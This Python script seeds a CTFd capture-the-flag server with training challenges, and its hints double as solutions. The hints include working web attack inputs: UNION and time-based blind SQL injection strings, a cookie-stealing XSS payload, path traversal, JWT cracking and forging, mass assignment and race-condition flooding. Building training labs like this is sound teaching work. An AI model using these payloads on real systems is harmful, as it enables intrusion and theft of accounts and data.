#!/usr/bin/env python3
"""Populate CTFd with all 16 challenges (flags + hints + connection info) via its API.

Flags are read from the environment (same names as .env), never hardcoded here. Idempotent:
skips a challenge whose name already exists.

    # CTFd running, an admin Access Token created in the CTFd UI (Settings -> Access Tokens):
    CTF_URL=http://localhost:8000 CTF_ADMIN_TOKEN=ctfd_xxx CTF_HOST=10.10.0.5 \
      python3 ctfd/seed-ctfd.py            # or add --dry-run to preview

Patch flags (+50%, human-reviewed) are awarded manually per the review workflow — not created
here. Hint costs are set; time-based unlocking needs a CTFd plugin (see notes).
Stdlib only.
"""
import argparse
import json
import os
import sys
import urllib.request
import urllib.error

CTF_URL = os.environ.get("CTF_URL", "http://localhost:8000").rstrip("/")
TOKEN = os.environ.get("CTF_ADMIN_TOKEN", "")
HOST = os.environ.get("CTF_HOST", "localhost")   # host players use to reach challenges


def C(value, *hints):
    """helper: build the 3 hint dicts with graduated cost (~10/15/25% of value)."""
    costs = [max(5, round(value * 0.10)), max(5, round(value * 0.15)), max(5, round(value * 0.25))]
    return [{"content": h, "cost": c} for h, c in zip(hints, costs)]


# name, category, value, flag_env, connection_info, description, [hints]
CHALLENGES = [
    ("Port recon", "Warm-up", 50, "FLAG_W1_PORTRECON",
     f"nmap -sV {HOST} -p 47000-49999",
     "A host is running a few services on unusual ports. Find the one leaking a flag in its banner.",
     C(50,
       "Scan for services and versions: nmap -sV <host> -p 47000-49999.",
       "One port's banner looks like a real service; another just says 'nothing here'.",
       "Connect to the interesting port with nc and read the banner token.")),

    ("Encoding chain", "Warm-up", 50, "FLAG_W2_ENCODING",
     "file: challenge.txt (provided in your environment)",
     "An intercepted message has been through several encoding layers. None of them are encryption.",
     C(50,
       "It's been through more than one layer. Start from the outside.",
       "base64 -> then it's hex -> then ROT13.",
       "Decode: base64 -d | xxd -r -p, then apply ROT13.")),

    ("Weak hash", "Warm-up", 75, "FLAG_W3_WEAKHASH",
     "file: hashes.txt (provided). Submit the cracked plaintext.",
     "Two password hashes leaked. Crack what you can and submit the plaintext. Not every hash is meant to be cracked.",
     C(75,
       "Identify the hash types first: hashid.",
       "One is an unsalted MD5 (crackable); the other is bcrypt (won't crack on a laptop).",
       "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt, then submit the plaintext.")),

    ("Hidden in a file", "Warm-up", 50, "FLAG_W4_HIDDENFILE",
     "files: telemetry.bin, photo.dat (provided)",
     "Two files were recovered. One hides a flag; the other isn't what its name suggests.",
     C(50,
       "Check what each file really is: file *.",
       "One is a binary with an embedded string; run strings on it.",
       "strings telemetry.bin | grep flag  (exiftool works too). photo.dat is a renamed PNG.")),

    ("Product search", "Web", 100, "FLAG_C1_SQLI",
     f"http://{HOST}:5001/",
     "Acme's parts catalogue search. Somewhere in the same database is a Flags table with a Secret column that search was never meant to reach. Pull the secret out through the search box.",
     C(100,
       "Your input goes straight into the query text. The classic move is a UNION: it needs the same number of columns.",
       "The app wraps your input; it appends a closing quote. End your payload with -- to comment it out. Confirm with ' OR 1=1 --.",
       "4 columns; there's a Flags table with Secret: ' UNION SELECT NULL, Secret, NULL, NULL FROM Flags --.")),

    ("Invoices", "Web", 100, "FLAG_C2_IDOR",
     f"http://{HOST}:5002/invoices.html  (login user1@corp.local / hunter2)",
     "Acme billing. You can see your own invoices — can you see someone else's?",
     C(100,
       "The by-id endpoint checks you're logged in — but does it check the invoice is yours?",
       "The {id} is a number you control. Try ids that aren't in your own list.",
       "Log in as user1, then GET /api/invoices/3 — the admin's invoice, flag in the notes.")),

    ("Billing service", "Recon", 75, "FLAG_C3_GITSECRET",
     "git repo provided on your player host (billing-service)",
     "A billing service repo. The current files look clean, but git remembers everything.",
     C(75,
       "The working tree is clean — look at the commit history: git log --oneline.",
       "A commit adds production config; a later one 'removes' it. Removal doesn't erase history.",
       "git show <the 'Add production configuration' commit>, or git log -p | grep -i password.")),

    ("Order lookup", "Web", 200, "FLAG_C4_FROMSQLRAW",
     f"http://{HOST}:5004/api/orders/lookup?ref=",
     "Order lookup by reference. It's built with EF Core, so it must be safe... right?",
     C(200,
       "It uses EF Core — but not every EF method parameterizes. Read how the query is built.",
       "FromSqlRaw with an interpolated string is concatenation in disguise. Confirm with ref=' OR 1=1 --.",
       "5 columns: ref=' UNION SELECT 1,1,1,1,Secret FROM Flags --.")),

    ("Profile", "Web", 200, "FLAG_C5_MASSASSIGN",
     f"http://{HOST}:5005/  (login user1@corp.local / hunter2; PUT /api/profile)",
     "Update your profile. The admin panel is off-limits... unless the update endpoint trusts too much.",
     C(200,
       "The profile update binds the request body onto the user record. Which fields does it copy?",
       "It copies isAdmin straight from your JSON. Send a field the UI never shows you.",
       'PUT /api/profile with "isAdmin": true, then GET /api/admin/panel.')),

    ("Community board", "Web", 200, "FLAG_C6_XSS",
     f"http://{HOST}:5006/board/",
     "A comment board. An admin reviews new comments. React escapes by default — but does this code?",
     C(200,
       "How are comments rendered? Look for dangerouslySetInnerHTML.",
       "<script> in innerHTML won't run, but event handlers do. Something reviews new comments — whose session does your code run in?",
       "Steal the reviewer's cookie: <img src=x onerror=\"fetch('/collect?d='+encodeURIComponent(document.cookie))\">, then read /collect/log.")),

    ("Report download", "Web", 150, "FLAG_C7_PATHTRAVERSAL",
     f"http://{HOST}:5003/reports.html",
     "Download monthly reports by filename. The reports folder isn't the only thing on disk.",
     C(150,
       "The download joins your filename onto the reports folder. Is it validated before reading?",
       ".. means 'up one directory'. Interesting things sit just outside the reports folder.",
       "file=../flag.txt (URL-encode it); go up further with ../../ if needed.")),

    ("Token service", "Web", 250, "FLAG_C8_WEAKJWT",
     f"http://{HOST}:5008/api/token/login  (login user1@corp.local / hunter2)",
     "The API issues JWTs. Admin data needs an admin token — which you weren't given.",
     C(250,
       "A JWT payload is just base64 — decode it. What proves it wasn't tampered with?",
       "The signature is only as strong as the key. Crack it offline: jwt_tool <token> -C -d challenges/jwt-wordlist.txt.",
       "Forge a token with role=admin (keep the right issuer/audience) and call /api/admin/data.")),

    ("Token service (integration)", "Web", 200, "FLAG_C9_JWTOFF",
     f"http://{HOST}:5009/api/token/login  (login user1@corp.local / hunter2)",
     "The API issues JWTs. The signing key is strong — but is every token really being checked?",
     C(200,
       "Your user token is rejected for admin. Are there other endpoints that hand out tokens?",
       "The partner token is role=admin but for a different issuer/audience. Would a correct API accept it here? Try it.",
       "GET /api/partner/token, then send that token to /api/admin/data.")),

    ("Status check", "Web", 350, "FLAG_C10_BLINDSQLI",
     f"http://{HOST}:5010/api/status?ref=",
     "An order status check. It always returns the same thing — but is it injectable?",
     C(350,
       "Try making it pause: ref=x'; IF(1=1) WAITFOR DELAY '0:0:3' --.",
       "No data comes back, but the response time is a yes/no oracle.",
       "Script it: for each position, test SUBSTRING((SELECT TOP 1 Secret FROM Flags),pos,1)='c' + WAITFOR. Rebuild the flag.")),

    ("Allocation", "Web", 400, "FLAG_C11_RACE",
     f"http://{HOST}:5011/api/allocate  (POST)",
     "A limited item can be allocated only a few times. Or can it?",
     C(400,
       "Allocating reads the count, checks the limit, then writes. What happens between check and write?",
       "Send many requests at once so they all read 'under the limit' before any saves.",
       "Fire 20-30 parallel POSTs (xargs -P / threads), then GET /api/allocate/status.")),

    ("Admin dashboard", "Web", 300, "FLAG_C12_BUNDLEKEY",
     f"http://{HOST}:5012/dashboard/",
     "An internal admin dashboard. How does its JavaScript talk to the API?",
     C(300,
       "The page loads data from an API. Look at the JavaScript it ships to your browser.",
       "The API key is embedded in app.js — anything sent to the browser is public.",
       "Use that key against a privileged endpoint: GET /api/admin/export with X-Api-Key.")),
]


def api(method, path, body=None):
    req = urllib.request.Request(f"{CTF_URL}{path}", method=method,
                                 data=json.dumps(body).encode() if body is not None else None)
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Token {TOKEN}")
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())


def existing_names():
    try:
        return {c["name"] for c in api("GET", "/api/v1/challenges").get("data", [])}
    except Exception:
        return set()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true", help="print what would be created, call nothing")
    args = ap.parse_args()

    if not args.dry_run and not TOKEN:
        sys.exit("Set CTF_ADMIN_TOKEN (CTFd Settings -> Access Tokens). Or use --dry-run.")

    have = set() if args.dry_run else existing_names()
    created = skipped = missing = 0

    for name, cat, value, flag_env, conn, desc, hints in CHALLENGES:
        flag = os.environ.get(flag_env)
        if not flag:
            print(f"! {name}: {flag_env} not set in env — skipping (set it in .env)")
            missing += 1
            continue
        if name in have:
            print(f"= {name}: already exists — skipping")
            skipped += 1
            continue
        print(f"+ {name} [{cat}] {value}pts  flag<-{flag_env}  hints={len(hints)}")
        print(f"    connection: {conn}")
        if args.dry_run:
            created += 1
            continue
        ch = api("POST", "/api/v1/challenges", {
            "name": name, "category": cat, "description": desc, "value": value,
            "type": "standard", "state": "visible", "connection_info": conn,
        })["data"]
        cid = ch["id"]
        api("POST", "/api/v1/flags", {"challenge_id": cid, "content": flag, "type": "static"})
        for h in hints:
            api("POST", "/api/v1/hints", {"challenge_id": cid, "content": h["content"], "cost": h["cost"]})
        created += 1

    print(f"\n{'DRY RUN — ' if args.dry_run else ''}created {created}, skipped {skipped}, missing-flag {missing}")
    if args.dry_run:
        print("Set flags in the environment and re-run without --dry-run against a live CTFd.")


if __name__ == "__main__":
    main()
